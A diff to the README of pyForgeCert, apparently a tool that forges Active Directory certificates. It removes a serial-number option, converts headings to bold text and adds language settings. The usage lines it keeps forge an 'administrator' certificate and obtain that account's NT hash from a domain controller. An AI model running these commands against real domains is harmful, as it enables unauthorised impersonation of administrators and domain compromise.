@@ -17,15 +17,13 @@ optional arguments:
                         UPN of the user to authenticate as.
   -o OUTPUT, --output OUTPUT
                         Path where to save the new .pfx certificate.
-  -se SERIAL, --serial SERIAL
-                        Serial number for the forged certificate.
   -op OPASSWORD, --opassword OPASSWORD
                         Password to the .pfx file.
   -c CRL, --crl CRL     Ldap path to a CRL for the forged certificate.
   -pfx                  If the input file is PFX.
 ```
 
-### Using PEM
+**Using PEM**
 ```
 python pyForgeCert.py -i cert.pem -o admin.pfx
 ```
@@ -33,7 +31,7 @@ python pyForgeCert.py -i cert.pem -o admin.pfx
 
 Default SubjectAltName is `administrator`, if you want to change it, use `-a`.
 
-### Using PFX
+**Using PFX**
 ```
 python pyForgeCert.py -i cert.pfx -o admin.pfx -pfx -p 123
 ```
@@ -52,17 +50,10 @@ python tools/getnthash.py cgdomain.com/administrator -dc-ip 10.211.55.200 -k 62b
 ```
 ![](https://blogpics-1251691280.file.myqcloud.com/imgs/202108061333685.png)
 
+**How to change language**
 
-### **Set the specified serial number**
-use `get_sn.py` get target serial number
-```
-python get_sn.py 192.168.190.94
-```
-![](https://blogpics-1251691280.file.myqcloud.com/imgs/202108091513974.png)
+Edit conf.py and change LANG variable to your lang
 
-Set serial number
-```
-python pyForgeCert.py -i 1.pem -o admin.pfx -se 802826827172011537117970693465759827135299588
-```
-
-![](https://blogpics-1251691280.file.myqcloud.com/imgs/202108091514165.png)
+**Supported Languages**
+English (set by default in repository): en
+Spanish: es
